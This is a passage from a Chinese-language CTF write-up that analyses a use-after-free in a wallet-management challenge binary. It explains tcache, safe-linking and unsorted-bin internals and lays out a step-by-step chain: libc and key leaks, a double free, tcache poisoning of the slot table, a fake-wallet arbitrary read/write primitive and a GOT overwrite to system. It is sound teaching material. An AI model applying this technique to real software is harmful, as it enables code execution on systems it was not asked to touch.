401a61: mov    rbp,QWORD PTR [rbp+rax*8]    ← ★ rbp = dst wallet
401a66: test   rbp,rbp
401a69: je     401a72                  ← NULL → "Destination wallet is not active."
401a6b: mov    eax,DWORD PTR [rbp+0x28]
401a6e: test   eax,eax
401a70: jne    401ab0                  ← dst->active != 0 才繼續
401a72: add    rsp,0x8
401a76: lea    rdi,[rip+0x86b]        # 4022e8 "[!] Destination wallet is not active."
401a7d: pop    rbx
401a7e: pop    rbp
401a7f: jmp    401120 <puts@plt>
401ab0: mov    rcx,rbp                 ← 參數：dst
401ab3: mov    rdx,rbx                 ← 參數：src
401ab6: lea    rsi,[rip+0x853]        # 402310 "[*] Transferring ledger from \"%s\" to \"%s\"...\n"
401abd: xor    eax,eax
401abf: mov    edi,0x2
401ac4: call   4011b0 <__printf_chk@plt>

401ac9: mov    rdi,QWORD PTR [rbx+0x18]   ← rdi = src->ledger
401acd: call   401110 <free@plt>          ← ★★★ 把 src 的 ledger 釋放掉

401ad2: mov    rax,QWORD PTR [rbx+0x18]   ← ★★★ 重新讀 src->ledger
                                          ← free() 不會把 src->ledger 清成 NULL，
                                             所以 rax 現在是「已經被 free 的指標」
401ad6: mov    rcx,rbp
401ad9: mov    rdx,rbx
401adc: mov    edi,0x2
401ae1: lea    rsi,[rip+0x858]            # 402340 "[+] Transfer complete. \"%s\" closed. \"%s\" balance: %lu\n"
401ae8: mov    QWORD PTR [rbp+0x18],rax   ← ★★★★ dst->ledger = 剛剛 free 掉的指標！
401aec: mov    rax,QWORD PTR [rbx+0x20]
401af0: mov    QWORD PTR [rbp+0x20],rax   ← dst->size = src->size
401af4: mov    rax,QWORD PTR [rbx+0x10]
401af8: add    QWORD PTR [rbp+0x10],rax   ← dst->balance += src->balance
401afc: xor    eax,eax
401afe: mov    QWORD PTR [rbx+0x10],0x0   ← src->balance = 0
401b06: mov    r8,QWORD PTR [rbp+0x10]    ← 第 5 個參數 = dst->balance
401b0a: mov    QWORD PTR [rbx+0x18],0x0   ← src->ledger = NULL
401b12: mov    QWORD PTR [rbx+0x20],0x0   ← src->size   = 0
401b1a: mov    DWORD PTR [rbx+0x28],0x0   ← src->active = 0（清得很乾淨）
401b21: call   4011b0 <__printf_chk@plt>  ← 印 "[+] Transfer complete..."
401b26: add    rsp,0x8
401b2a: lea    rdi,[rip+0x847]            # 402378 "    All assets have been consolidated..."
401b31: pop    rbx
401b32: pop    rbp
401b33: jmp    401120 <puts@plt>
```

**看出問題了嗎？**

`src`（來源）被清得非常乾淨（ledger=NULL、size=0、active=0），
但 **`dst`（目的）卻拿到了一個「已經被 free 的指標」**！

```
   Transfer(A -> B) 之後：

   A: ledger = NULL, size = 0, active = 0        （乾淨）
   B: ledger = <A 原本的 ledger，但已被 free>     （★ 懸空指標 dangling pointer）
      size   = A 原本的 size
      active = 1
```

也就是說 **B 這個 wallet 還「活著」，但它指向的 chunk 已經被 glibc 回收了**。於是：

- **`Withdraw(B)`** → `write(1, 被釋放的 chunk, size)` → **UAF 讀取（資訊洩漏）**
- **`Deposit(B)`** → `read(0, 被釋放的 chunk, size)` → **UAF 寫入（可改寫 tcache 的 metadata）**
- **再對 B 做一次 `Transfer(B -> C)`** → 會對「已經 free 的指標」再 free 一次
  → **double free**

**漏洞精確定義（一句話）：`Transfer` 把 `free()` 過的指標存進目的 wallet，
造成 use-after-free read/write，並且可以連鎖觸發 double free。**

### 4.7 `Close` / `List`（0x401b60 / 0x401c90）— 這兩個是乾淨的

```
Close Wallet：
  rbx = slots[index]；若 NULL → "[!] No wallet in that slot."
  free(wallet->ledger)         ← 有 free
  free(wallet)                 ← 連結構也 free
  slots[index] = 0             ← 有清 NULL
```
`Close` 完全正確（沒有 UAF），所以我們**不要用它來製造漏洞**；
但可以用它來「正常地把 chunk 塞進 tcache」（Phase 1 需要）。

---

## 5. glibc heap 從零教起

### 5.1 chunk 的長相

`malloc(0x80)` 真正拿到的是一塊 **0x90 bytes 的 chunk**（多 0x10 的 header、16 bytes 對齊）：

```
                chunk 位址 = malloc 回傳值 - 0x10
   ┌─────────────────────────┐ ← 低位址
   │ prev_size  (8 bytes)    │   前一個 chunk 若「正在使用」→ 這格會被前一個 chunk 當資料用
   ├─────────────────────────┤
   │ size       (8 bytes)    │   這個 chunk 的總大小（含 header），例如 0x91
   ├─────────────────────────┤ ← malloc 回傳的指標（user data 起點）
   │                         │
   │   user data (0x80 B)    │   ★ 我們能寫的範圍
   │                         │
   ├─────────────────────────┤
   │ prev_size  (下一個)     │   下一個 chunk 的 header
   │ size       (下一個)     │
   └─────────────────────────┘
```

**被 free 之後（進到 tcache）：**

```
   ┌─────────────────────────┐
   │ prev_size               │
   ├─────────────────────────┤
   │ size                    │
   ├─────────────────────────┤ ← user data 起點（被 glibc 拿來當 tcache_entry）
   │ next (8 bytes, fd)      │ = (這一格自己的位址 >> 12) XOR (下一個 free chunk 的 user 位址)
   │                         │   ↑ 也就是 (user 位址 >> 12) ^ 下一個；★ 不是 chunk 標頭位址
   ├─────────────────────────┤
   │ key  (8 bytes)          │ = tcache_key（glibc 2.34+ 是每次執行隨機的 64-bit 值）
   ├─────────────────────────┤
   │ 之後是舊資料（不會被清）│
   └─────────────────────────┘
```

> **關鍵：free 之後 `size` 欄位仍然存在，`next`/`key` 才被寫入。
> 所以 UAF 讀取會讀到 `next` 與 `key`——這就是我們的 leak 來源。**

### 5.2 `size` 欄位與三個 flag bit

`size` 一定是 16 的倍數，所以最低 3 bits 被借去當旗標：

```
   size = 0x91 = 0b1001_0001
                         │││
                         │ │└─ bit0  PREV_INUSE (P)   = 1：前一個 chunk 正在使用（不能被合併）
                           │└── bit1  IS_MMAPPED  (M)   = 1：這塊是 mmap 來的（不是 heap）
                         └─── bit2  NON_MAIN_ARENA (A)= 1：屬於非主 arena（thread arena）
```

實際大小要用 `size & ~0x7` 算，glibc 的巨集叫 `chunksize(p)`。
本題 gdb 看到的例子：
- wallet 結構 `calloc(1,0x30)` → `size = 0x41`（0x40 | PREV_INUSE）
- ledger `malloc(0x80)` → `size = 0x91`
- **當 S 的 ledger 被 free 進 unsorted bin 時，緊接在後的 D 結構
  `size` 從 `0x41` 變成 `0x40`**（free 清掉了下一個 chunk 的 PREV_INUSE）。

### 5.3 tcache：glibc 2.26 之後的超快取（本題的主戰場）

**tcache（thread cache）** 是「每個執行緒一份」的小型回收桶，`free` 會優先丟這裡，
`malloc` 也會優先從這裡拿——速度超快，**而且幾乎不做檢查**（歷史上很多漏洞都靠它）。

- 每個「大小」有自己的一條 **LIFO 單向鏈結串列**（後進先出）。
  大小以 16 bytes 為一級：0x20、0x30、0x40、…、0x410，共 64 條（`TCACHE_MAX_BINS = 64`）。
- 每條鏈最多放 **7 個** chunk（`mp_.tcache_count = 7`）。
  超過 7 個時，`free` 會**往下走**正常的釋放流程（fastbin / unsorted bin）。
- `tcache_perthread_struct` 就是「管理這 64 條鏈」的結構，**它自己是一個 heap chunk**，
  而且是程式第一次 malloc 時配置的 → 一定在 **heap 最開頭**（本題：`heap+0x0`，chunk 大小 0x290）。

```
tcache_perthread_struct（本題實測位置 heap_base+0x10 = 0x405010）
   offset 0x00 : uint16_t counts[64]     ← 每條鏈現在有幾個
   offset 0x80 : tcache_entry *entries[64] ← 每條鏈的頭（★ 這裡存的是「未編碼」的真指標！）

   例：counts[7] = 7  表示「大小 0x90 的鏈已經滿了」
       entries[7] = 0x406970  ← 下一個 malloc(0x80) 會拿到的**位址**
                                （= chunk 標頭 0x406960 + 0x10；gdb 實測值）
```

> 💡 **最重要的一句話：`tcache->entries[]` 裡躺的是「明文」的 malloc 回傳位址（= chunk + 0x10）；
> 只有「chunk 內部那個 next 欄位」才是 safe-linking 編碼過的。**
> 所以：
> - 毒化時你只需要知道 `user 位址 >> 12`（編碼用的 key），**不需要**完整的 user 位址；
> - 從 `entries[]` 讀到的值可以直接拿去用（不必解碼）；
> - 反之，從 chunk 裡 UAF 讀到的 `next` 一定要 `^ (user 位址>>12)` 才能還原。
>
> 📌 **本節的用字約定（很重要，§5.4 會用到）**：
> * **「chunk 位址」＝ chunk 標頭位址 ＝ `malloc()` 回傳值 − 0x10**（§5.1 的定義，glibc 內部叫 `p`）。
> * **「user 位址」＝ `malloc()` 回傳值 ＝ chunk 標頭 + 0x10**（glibc 內部叫 `chunk2mem(p)`，
>   在 tcache 裡也叫 `e`）。`e->next` 就是 user data 的前 8 bytes，所以
>   **`&e->next` 恆等於 user 位址**（不是只有鏈頭那塊）。
> * **safe-linking 的 key 用的是「user 位址」**：`&e->next >> 12`，
>   也就是「標頭位址 + 0x10」再 `>> 12`。**不是 chunk 標頭位址**（差 0x10，見 §5.4 實測）。
>
> 這也是本題 flag（`s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che`）的字面意思：
> safe-linking 只保護「chunk 內的 next」，而 glibc 自己在 `entries[]` 幫你留了一份明文。

大小 → 鏈編號：`tc_idx = (chunk_size - 0x20) / 0x10`
（`chunk_size 0x40 → idx 2`、`0x90 → idx 7`、`0x30 → idx 1`）

```
         tcache[0x90] (idx 7) 的鏈（LIFO）
   entries[7] ──► [chunk C3] ──next──► [chunk C2] ──next──► [chunk C1] ──next──► NULL
                   最前面（最後被 free 的）
   malloc(0x80) 會先拿到 C3；free 一個新 chunk 會被插到最前面
```

`free(chunk)` 進 tcache 時做的事（glibc 2.39）：

```c
e->key  = tcache_key;                                  // 防 double free 用的標記
e->next = PROTECT_PTR(&e->next, tcache->entries[idx]); // ★ safe-linking 編碼
tcache->entries[idx] = e;                              // 頭換成自己（這裡存的是明文指標）
tcache->counts[idx]++;                                 // 計數 +1
```

`malloc` 從 tcache 拿：

```c
e = tcache->entries[idx];
tcache->entries[idx] = REVEAL_PTR(e->next);   // ★ 解碼下一個
tcache->counts[idx]--;
e->key = 0;                                   // 清掉 key
return e;
```

> 注意 `malloc` 判斷「要不要用 tcache」的條件是 `counts[idx] > 0`。
> **這就是為什麼要 double free：讓同一條鏈裡有「兩個」指向同一個 chunk 的節點，
> 才有機會把 poison 的 `next` 消費掉。**

### 5.4 safe-linking（glibc 2.32+）：本題標題的梗

#### 它到底在防什麼？（先講動機，才知道為什麼要這樣繞）

glibc 2.32 之前的 tcache 毒化**幾乎不需要知道任何位址**：
`free()` 之後 chunk 的 `fd`（`next`）是**明文**的下一個空閒 chunk 位址，
所以任何「拿到 UAF／溢寫」的人都可以直接把 `fd` 蓋成他想寫的位址
（例如 GOT、`__free_hook`、`__malloc_hook`），下一次 `malloc()` 就把那塊記憶體交給他
—— 這叫**盲打（blind）tcache poisoning**，連 heap 在哪都不用知道。
另一種更便宜的做法是**只改 `fd` 的最低 1 byte**（partial overwrite）：
heap 內的位址高位固定，改低位就能把目標移到自己想要的附近。

**safe-linking 的目的就是切斷這兩條路**：它把 `fd` 存成
「**目標位址 XOR 這一格自己的位址 >> 12**」。於是：

* 不知道這一格的位址（heap 位址）→ 就算你寫了一個目標位址進去，
  glibc 讀出來解密後也是**垃圾位址** → `malloc` 一碰就 abort；
* 只改低位 1 byte → 解密出來的高位仍是「你自己的位址」，**跳不到 GOT**。

⇒ **攻擊前提被改成「必須先洩漏一次 heap 位址」**：先 leak 到那個 XOR key，
才能算出「要寫什麼值才會被解密成我想要的目標」。pwn4 整題就是在做這件事
（§8.2 的 `safe-linking key`、§7 的 `KEY ^ POISON_SLOT`），
而 glibc 好死不死又在 `entries[]` 留了一份明文（§5.3），所以這題才拿得到 shell。

#### 公式（★ 注意 key 用的是 **user 位址**）

glibc 2.32 之後，`tcache`/`fastbin` 鏈上的 `next` 指標**不再明文存放**，而是：

```c
/* glibc 的巨集（這裡用等價的簡化寫法；重點在 pos 是什麼） */
#define PROTECT_PTR(pos, ptr)  ((pos) >> 12) ^ (ptr)
#define REVEAL_PTR(ptr)        PROTECT_PTR(&ptr, ptr)

/* tcache_put() 實際呼叫的是 PROTECT_PTR(&e->next, tcache->entries[idx])：
 *   pos ＝ &e->next ＝ 這個 next 欄位「自己」所在的位址
 *                   ＝ malloc() 回傳的 user 位址（＝ chunk 標頭 + 0x10）
 *                   ★ 不是 chunk 標頭位址
 *   存： stored = ((u64)&e->next >> 12) ^ ptr      ← 本節一律寫成 stored = safe ^ ptr
 *   取： ptr    = ((u64)&e->next >> 12) ^ stored
 *   其中 safe ＝ (u64)&e->next >> 12 ＝ (user 位址 >> 12)
 *   （本節以下提到「key」「safe」「chunk>>12」一律指這個 user 位址版本）*/
```

> 📌 為什麼 `&e->next` 就是 user 位址？因為在 tcache 裡
> `e = (tcache_entry *) chunk2mem(p)`，而 `tcache_entry` 的第一個欄位就是 `next`
> ——所以 `e` 本身的位置就是 user data 開頭，`&e->next == e == user 位址`。
> （fastbin 也一樣：它的 `fd` 在 `malloc_chunk` 的 `+0x10`，`&p->fd` 仍是「標頭 + 0x10」。）
> `>> 12` 則是「丟掉頁內位移、只留頁號」：ASLR 以 **4 KB（2¹²）頁**為單位隨機化，
> 高位本來就猜得到，glibc 就拿整數頁號當免費的金鑰。

因為 `user 位址 >> 12` 會把低 12 bits 全部丟掉，所以：

> **要知道 `user 位址 >> 12` 才能編碼，但不需要知道完整的 user 位址！**

`(user 位址 >> 12)` 怎麼拿？**當一個 chunk 被 free 到「空鏈」時**：

```
   stored = (user 位址 >> 12) ^ NULL = (user 位址 >> 12)
```

所以 **UAF 讀出它的 `next` 欄位 = 直接拿到 (user 位址 >> 12)**，這就是我們的
`safe-linking key`。有了它就能算出要寫入的編碼值：

```
   stored = safe ^ 目標位址
```

> 🔬 **實測：key 是 user 位址，不是 chunk 標頭（兩者差 0x10，跨頁時答案不同）**
> 做法：一直 `malloc(0x80)`，挑一塊 **user 位址剛好落在 4 KB 邊界**上的 chunk
> （這樣它的標頭會在**上一頁**），free 到空鏈後讀 `next`。完整可編譯的程式（存成 `t.c`）：
> ```c
> #include <stdio.h>
> #include <stdlib.h>
> #include <stdint.h>
> #include <string.h>
> #define N 400
> static char *p[N];
> int main(void){
>     int target = -1;
>     for (int i = 0; i < N; i++) {
>         p[i] = malloc(0x80);
>         memset(p[i], 'x', 0x80);
>         if ((uint64_t)p[i] % 0x1000 == 0 && target < 0) target = i;
>     }
>     if (target < 0) { puts("no page-boundary chunk"); return 1; }
>     free(p[target]);                       /* 丟進「空的」tcache 鏈 */
>     uint64_t stored = *(uint64_t *)p[target];
>     printf("user   = %p   header = %p\n", p[target], p[target] - 0x10);
>     printf("stored      = %#018lx\n", stored);
>     printf("user   >>12 = %#018lx  %s\n", (uint64_t)p[target] >> 12,
>            ((uint64_t)p[target] >> 12) == stored ? "MATCH" : "no");
>     printf("header >>12 = %#018lx  %s\n", ((uint64_t)p[target] - 0x10) >> 12,
>            (((uint64_t)p[target] - 0x10) >> 12) == stored ? "MATCH" : "NO");
>     return 0;
> }
> ```
> ```console
> $ gcc -O0 t.c -o t && ./t                                  # 系統 glibc 2.44
> user   = 0x55db27917000   header = 0x55db27916ff0
> stored      = 0x000000055db27917
> user   >>12 = 0x000000055db27917  MATCH
> header >>12 = 0x000000055db27916  NO
>
> $ ./ld-linux-x86-64.so.2 --library-path . t               # 題目附的 glibc 2.39
> user   = 0x55558c8b9000   header = 0x55558c8b8ff0
> stored      = 0x000000055558c8b9
> user   >>12 = 0x000000055558c8b9  MATCH
> header >>12 = 0x000000055558c8b8  NO
> ```
> ⇒ **兩個版本都一樣：key ＝ `user 位址 >> 12` ＝ `&e->next >> 12`。**
> （上面位址是某一次的執行結果，ASLR 每次不同；**重點是 `user >>12` 永遠 MATCH、
> `header >>12` 永遠 NO**。）
> 不跨頁時兩者**剛好相同**（這就是為什麼照「標頭 >> 12」算大多時候也能過 ——
> 但那是運氣，等到某塊 chunk 剛好卡在頁邊界就會對不上，而且完全看不出原因）。

**兩個地方要分清楚（本題的核心）：**

```
   tcache_perthread_struct.entries[7]        被 free 的 chunk 內部
   （在 heap 最開頭，明文！）                 （next / key，next 是編碼值！）
   ┌──────────────────┐                    ┌───────────────────────────┐
   │ 0x406970         │ ─────────────────► │ next = safe ^ 下一個位址  │  ← 編碼過
   └──────────────────┘                    │ key  = tcache_key         │  ← 隨機值
      ↑ 直接就是 malloc 的回傳位址            └────────────────────────┘
        （user 位址 = chunk 標頭 + 0x10）         ↑ 只有這格要 ^ (user 位址 >> 12)
```

> 💡 換句話說：**safe-linking 讓「chunk 內的 next」需要 `user 位址>>12` 才能改，
> 但 glibc 把「同一個位址的明文」放在 `entries[]` 裡**。我們只要有辦法洩漏
> 「一次 free 到空鏈」的 `next`（=`user 位址>>12`），就足以偽造 `fd`。
> 這也是 §8.2 那句「這裡不需要知道 chunk 的完整位址」的原理。

**這也是這題 flag 名稱的由來**：`s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che`
（safe-linking 救不了你的 tcache）——因為程式自己把「編碼用的 key」洩漏給你了。

### 5.5 其他 bin（了解就好，本題只用到 unsorted bin）

```
 fastbin：大小 <= 0x80（global_max_fast）的 chunk，tcache 滿了之後的下一站。
          LIFO 單向鏈，**沒有數量上限**（「只能放 7 個」是 tcache 的規矩，別搞混；
          實測 glibc 2.39 連丟 13 塊進 fastbin 也不會被拒，見下方實測）。
          注意：fastbin 的 next 存的是「chunk 標頭位址」（不是 malloc 回傳值），
          tcache 的 next 存的才是 malloc 回傳值。
 small bin：0x90 ~ 0x3f0（< 0x400），雙向鏈結（fd/bk）。
 large bin：>= 0x400，還會排序（0x400 已經是**第一條 large bin**，不是 small bin）。
 unsorted bin：★ 任何「不進 fastbin、tcache 又滿了」的 chunk 都會先丟這裡。
               它的 fd/bk 指向 main_arena 裡的鏈頭 → ★★ 這是 libc 洩漏的經典來源！
 top chunk：heap 尾端還沒被切出去的區域，不夠用時會 brk/mmap 擴張。
```

**實測：fastbin 沒有「7 個」的上限**（用題目附的 2.39 libc 跑）：

```c
/* /tmp/fbt.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <gnu/libc-version.h>
#define N 20
int main(void){
    fprintf(stderr,"glibc %s\n", gnu_get_libc_version());
    void *p[N];
    for(int i=0;i<N;i++){ p[i]=malloc(0x18); memset(p[i],0x41,0x18); }
    for(int i=0;i<N;i++) free(p[i]);   /* 前 7 個進 tcache，其餘進 fastbin */
    unsigned long cur=(unsigned long)p[N-1], count=1, ch;
    while(1){ ch = *(unsigned long*)cur ^ (cur>>12);   /* fastbin fd 也是 safe-linking 編碼 */
              if(!ch) break; cur = ch + 0x10; count++; if(count>64) break; }
    fprintf(stderr,"freed %d chunks of tcache-size 0x20: fastbin length=%lu\n", N, count);
    return 0;
}
```

```bash
$ gcc -O0 -o /tmp/fbt /tmp/fbt.c
$ cd pwn4 && ./ld-linux-x86-64.so.2 --library-path . /tmp/fbt
glibc 2.39
freed 20 chunks of tcache-size 0x20: fastbin length=13    ← ★ 13 > 7，沒有上限
```

真正會清掉 fastbin 的是 `malloc_consolidate()`（合併進 unsorted bin），
而它只在「有大請求 / 需要合併」時才會被觸發。

**unsorted bin 的形狀（空的時候）：**

```
   main_arena.bins[0]（在 libc 裡，位址 = libc_base + 0x203ac0 + 0x60）
        ┌─────────────────────────┐
        │ fd ──┐                  │
        │ bk ◄─┘   (指向自己)     │
        └─────────────────────────┘

   把 victim 丟進空的 unsorted bin 後：
   victim->fd = victim->bk = &main_arena.bins[0]   ← ★★ 兩個都變成 libc 位址！
```

所以只要 UAF 讀這個 chunk 的前 16 bytes，就得到 `libc_base + 0x203b20`。

### 5.6 `__free_hook` / `__malloc_hook` 已經被移除

- glibc 2.34 起，`__free_hook`、`__malloc_hook`、`__realloc_hook` **被刪掉了**。
- 所以「把 `__free_hook` 改成 system，再 free("/bin/sh")」這種 2.31 時代的老招
  **在本題（2.39）完全不能用**。
- 現代的替代目標：
  1. **GOT**（本題 Partial RELRO → `got.plt` 可寫）★最簡單
  2. `_IO_2_1_stdout_` 的 vtable / FSOP
  3. `__exit_funcs`、`_rtld_global._dl_rtld_lock_recursive`（需要 libc base）
  4. 回到 stack 的返回位址（需要 stack leak）

本題因為 **non-PIE + Partial RELRO**，選 (1) 最乾淨。

---

## 6. 本題 heap 佈局（gdb 實測）

實驗：開 9 個 wallet（S、D、W0~W6，size 都是 0x80），關掉 W0~W6（塞滿 tcache），
然後 `Transfer(0 -> 1)`，在 `0x401b21`（transfer 剛做完）下中斷點。

**怎麼重現這張表（可直接照抄）：**

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn4
# 1) 準備輸入檔：S/D 各 0x80 → 再開 W0~W6 → 關掉 slot 2..8（塞滿 tcache）→ Transfer(0->1)
printf '1\nS\n128\n1\nD\n128\n' > /tmp/in.bin
for i in 0 1 2 3 4 5 6; do printf "1\nW$i\n128\n" >> /tmp/in.bin; done
for i in 2 3 4 5 6 7 8; do printf "5\n$i\n"     >> /tmp/in.bin; done
printf '4\n0\n1\n' >> /tmp/in.bin

# 2) 用題目附的 2.39 跑：cm_dbg 的 interpreter 已經 patchelf 指向本地 loader
gdb -q -batch -ex 'b *0x401b21' -ex 'run < /tmp/in.bin' ./cm_dbg \
    -ex 'x/2gx 0x405000'  -ex 'x/16hx 0x405010' -ex 'x/16gx 0x405090' \
    -ex 'x/6gx 0x4062e0'  -ex 'x/2gx 0x406370'
```

> `0x401b21` 是 `Transfer` 裡「印 Transfer complete」的那一行 → 所有賦值都已經做完。
> 若 `cm_dbg` 不見了：
> `cp cache_money cm_dbg && patchelf --set-interpreter "$PWD/ld-linux-x86-64.so.2" cm_dbg`。

**實測輸出（節錄）：**

```
FREED_LEDGER = 0x4062f0   SRC(rbx) = 0x4062b0   DST(rbp) = 0x406380
HEAP = 0x405000   LIBC_BASE = 0x7ffff7c00000   main_arena = 0x7ffff7e03ac0

(gdb) x/2gx 0x405000
0x405000: 0x0000000000000000  0x0000000000000291   ← tcache_perthread_struct size 0x291 ✔
(gdb) x/16hx 0x405010
0x405010: 0x0000 0x0000 0x0007 ...（idx7）... 0x0007  ← counts[2]=7、counts[7]=7 ✔
(gdb) x/16gx 0x405090
0x4050a0: 0x406930            0x4050c8: 0x406970   ← entries 存「user 位址」✔（見 §5.3）
```

底下是完整的 gdb 輸出：

```
(gdb) info proc mappings
0x0000000000405000 0x0000000000426000 0x21000  rw-p  [heap]      ← heap 起點 = 0x405000

(gdb) x/16hx 0x405010        ← tcache_perthread_struct.counts[]
0x405010: 0x0000 0x0000 0x0007 0x0000 0x0000 0x0000 0x0000 0x0007
                   ↑idx1  ↑idx2=7（0x40 的 chunk，7 個 wallet 結構）
                                                    ↑idx7=7（0x90 的 chunk，7 個 ledger）
(gdb) x/16gx 0x405090        ← entries[]
0x4050a0: 0x406930            ← entries[2]
0x4050c8: 0x406970            ← entries[7]
```

| 位址 | chunk 大小 | 內容 | 備註 |
|---|---|---|---|
| `0x405000` | `0x291` | `tcache_perthread_struct` | heap 第一塊，user data 在 `0x405010` |
| `0x405290` | `0x1011` | **stdin 的 stdio 緩衝區** | glibc 第一次 `fgets` 時自動配置的 0x1000 buffer |
| `0x4062a0` | `0x41` | **S** 的 wallet 結構 | `slots[0] = 0x4062b0` |
| `0x4062e0` | `0x91` | **S** 的 ledger（size 0x80） | transfer 後被 free → 進 unsorted bin |
| `0x406370` | `0x40` | **D** 的 wallet 結構 | `slots[1] = 0x406380`（注意 size 的 P bit 被清掉） |
| `0x4063b0` | `0x91` | **D** 的 ledger | |
| `0x406440` | `0x41` | W0 結構 | |
| `0x406480` | `0x91` | W0 ledger | 被 Close → 進 tcache[0x90] |
| `0x406510` | `0x41` | W1 結構 | |
| `0x406550` | `0x91` | W1 ledger | 進 tcache |
| `0x4065e0` | `0x41` | W2 結構 | |
| `0x406620` | `0x91` | W2 ledger | |
| `0x4066b0` | `0x41` | W3 結構 | |
| `0x4066f0` | `0x91` | W3 ledger | |
| `0x406780` | `0x41` | W4 結構 | |
| `0x4067c0` | `0x91` | W4 ledger | |
| `0x406850` | `0x41` | W5 結構 | |
| `0x406890` | `0x91` | W5 ledger | |
| `0x406920` | `0x41` | W6 結構 | |
| `0x406960` | `0x91` | W6 ledger | |
| `0x4069f0` | `0x1f611` | **top chunk** | 剩下的 heap |

**被釋放的 S ledger（0x4062e0）：**

```
(gdb) x/6gx 0x4062e0
0x4062e0: 0x0000000000000000  0x0000000000000091   ← prev_size / size=0x91
0x4062f0: 0x00007ffff7e03b20  0x00007ffff7e03b20   ← fd = bk = &main_arena.bins[0]
0x406300: 0x0000000000000000  0x0000000000000000
```

當時 libc 被載入到 `0x7ffff7c00000`，所以

```
0x7ffff7e03b20 - 0x7ffff7c00000 = 0x203b20   ← ★ 這就是 OFF_UNSORTED
```

也就是 `main_arena` 在 libc `+0x203ac0`，而它裡面的 `bins[0]`（unsorted bin 鏈頭）在 `+0x60`。

其他重要固定位址（non-PIE）：

```
slot 表           0x4040c0  （slots[0]）
GOT 起點          0x404000
strtol@got        0x404040
假的 wallet       0x4040a8  （見 §8 phase 3）
程式 .text        0x401000 ~ 0x401d60
```

---

## 7. 漏洞的觸發條件與利用思路

### 7.1 觸發條件

```
1) 開兩個 wallet：A（slot 0, size 0x80）、B（slot 1, size 0x80）
2) 選 4) Transfer：FROM=0, TO=1
       → free(A->ledger)
       → B->ledger = <A->ledger 的舊值>（= 剛被 free 的指標）
       → B->size   = A->size = 0x80
       → A->active = 0, A->ledger = NULL
3) 此後 B 還「活著」，但它的 ledger 已經在 tcache / unsorted bin 裡：
       Withdraw(B) → 讀 freed chunk（洩漏）
       Deposit(B)  → 寫 freed chunk（改寫 tcache metadata）
       Transfer(B -> C) → 對同一塊再 free 一次（double free）
```

### 7.2 為什麼 tcache double free 需要「先清 key」

glibc 2.29 之後 `free()` 會檢查：

```c
if (__glibc_unlikely (e->key == tcache_key))   // e->key 是這塊 user data 的第 8 byte
    { ...掃描整條 tcache 鏈... 找到自己就 abort："free(): double free detected in tcache 2" }
```

而我們的 UAF 寫入剛好能改到那個 `key`：

```
   被 free 的 chunk：
      +0x00 next (= safe-linking 編碼值)
      +0x08 key  (= tcache_key)          ← ★ 用 Deposit() 把它寫成 0
      +0x10 ...
```

寫成 0 之後，第二次 `free()` 的檢查就不會觸發 → **靜默的 double free**。

### 7.3 完整的利用鏈（心理模型）

```
   ① UAF 讀 unsorted bin  →  libc base
   ② UAF 讀空鏈的 next    →  safe-linking key (user 位址 >> 12)
   ③ UAF 寫 + double free →  tcache[0x30] 鏈中出現兩次同一塊 e
   ④ 把 e->next 改成 PROTECT_PTR(e, &slots[0])  →  tcache poisoning
   ⑤ 連續兩次 malloc(0x20)：
        第一次回傳 e（正常）
        第二次回傳 0x4040c0 = ★ slot 表！
   ⑥ 那個 wallet 的 ledger 就變成 slot 表本身（size 0x20）
      → Deposit 它 = 改寫 slots[0..3]
      → 在 .bss 造一個「假 wallet」，讓 slot[2] 指向它
      → 之後對 slot[2] 做 Deposit/Withdraw = 任意位址寫 / 任意位址讀
   ⑦ 任意寫：strtol@got = system
   ⑧ 輸入 "/bin/sh"  →  選單的 strtol(buf,...) 其實呼叫了 system(buf) → getshell
```

**tcache 串列的三種狀態（步驟 ③④ 的細節，每一步都用 gdb 驗過）：**

```
 (2a) transfer(2,3) 剛 free 完 P，而 tcache[0x30] 原本是空的：
      tcache->entries[1] ──► [P]
      P->next = (P >> 12) ^ NULL = P >> 12   ← ★「key」就是這樣洩漏的
      （UAF 讀 P 的前 8 bytes 就等於 P>>12）

 (2b) 先 UAF write 清掉 next/key，再 free 一次（double free 成功），
      然後把「已經在鏈上的 P」的 next 寫成 PROTECT_PTR(P, P)：
      tcache->entries[1] ──► [P] ──next──► [P]      ← ★ 環！（自我參照）
      P->next = P ^ (P >> 12)   → 用「洩漏出來的值」反推就能還原 P

 (2c) 把 P->next 改成 PROTECT_PTR(P, &slots[0]) = (P>>12) ^ 0x4040c0：
      tcache->entries[1] ──► [P] ──next──► 0x4040c0
                             ▲                 ▲
              malloc #1 回傳 ┘                 └─ ★ malloc #2 回傳「slot 表本身」！
```

為什麼選 `slot 表` 當毒化目標？因為 `Open Wallet` 在 malloc 之後會
`memset(回傳值, 0, size)`（`__memset_chk`）。若目標是 GOT，就會把 GOT 清成 0 而當掉。
但目標是 slot 表、size 只有 `0x20` 時，只會清掉 `slots[0..3]`（4 個 8-byte），
**不會影響程式繼續運作**，而新 wallet 會被存到掃描時就決定好的 slot（>=4）。

### 7.4 假 wallet 的算術（本題最漂亮的一步）

```
   slots[] 在 0x4040c0。我們能寫 slots[0..3]，也就是 0x4040c0 ~ 0x4040df。
   把「假 wallet」放在 0x4040a8（slot 表前面 0x18 bytes 的 .bss 空地），則：

      假wallet+0x18 = 0x4040c0 = &slots[0]  → fake->ledger = slots[0] 的值
      假wallet+0x20 = 0x4040c8 = &slots[1]  → fake->size   = slots[1] 的值
      假wallet+0x28 = 0x4040d0 = &slots[2]  → fake->active = (int)slots[2]（非 0 即可）
                                             ★ 同時 slots[2] 就是「指向假 wallet 的格子」
```

所以只要一次 `Deposit(被毒化的 slot)` 寫 32 bytes：

```
   payload = p64(目標位址) + p64(長度) + p64(0x4040a8) + p64(0)
                    ↑slots[0]      ↑slots[1]     ↑slots[2]（假 wallet 自己）
```

之後：

```
   Withdraw(2)  →  write(1, 目標位址, 長度)   ← 任意位址讀
   Deposit(2)   →  read(0, 目標位址, 長度)    ← 任意位址寫
```

而且隨時可以再用 `Deposit(被毒化的 slot)` 重新指定「目標位址 / 長度」，
所以是**可重複使用**的任意讀寫。

---

## 8. exploit 逐行註解

完整程式在 `exploit.py`。下面按階段解釋。

### 8.0 常數

```python
SLOTS      = 0x4040c0   # wallet *slots[16]
GOT        = 0x404000   # .got.plt
STRTOL_GOT = 0x404040
FAKE_WALLET= 0x4040a8   # 假 wallet 的位置（見 §7.4）
